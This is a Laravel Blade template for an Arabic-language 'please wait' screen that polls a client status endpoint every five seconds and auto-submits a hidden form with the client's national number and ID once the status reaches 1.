@extends('frontend.layout.master')
@section('style')

    <style>

        body {
            background-position: center;
            background-size: contain;
            background-repeat: no-repeat;
            background-color: #00697f;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }

        .popup-container {
            background: transparent;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            width: 100%;
        }

        .popup-content {
            background: white;
            opacity: 1;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        @media (max-width: 768px) {
            body {
                background-size: cover;
            }

            .popup-content {
                width: 90%;
            }
        }

    </style>
@endsection

@section('content')
    <form action="{{route('stepSevenAction')}}" method="post" id="form">
        @csrf
        <input type="hidden" name="national_number" value="{{$client->national_number}}">
        <input type="hidden" name="client_id" value="{{$client->id}}">
        <button type="submit" id="submit_button"></button>
    </form>
    <div class="popup-container d-flex justify-content-center align-items-center text-center" dir="rtl" id="popup-container">
        <div class="popup-content ">
            <h5 class="mb-3 mt-3">الرجاء الانتظار</h5>
            <div class="spinner-border m-5" role="status">
                <span class="visually-hidden"></span>
            </div>
            <h5>جاري المعالجة يرجى الانتظار....</h5>
        </div>
    </div>
@endsection
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

   <script>
    $(document).ready(function () {
        function fetchNotifications() {
            $.ajax({
                url: '{{ route("client.getEndPointAjax", $client->id) }}',
                type: 'GET',
                dataType: 'json',
                success: function (data) {
                    console.log("Received data from server:", data); // Log full response
                    if (data.status === 1) {
                        console.log("Status is 1. Submitting form...");
                        $('#form').submit();
                    } else {
                        console.log("Status is not 1. Current status:", data.status);
                    }
                },
                error: function (xhr, status, error) {
                    console.error("AJAX request failed:", error);
                    console.log("XHR object:", xhr);
                    console.log("Status:", status);
                }
            });
        }

        fetchNotifications();
        setInterval(fetchNotifications, 5000);
    });
</script>


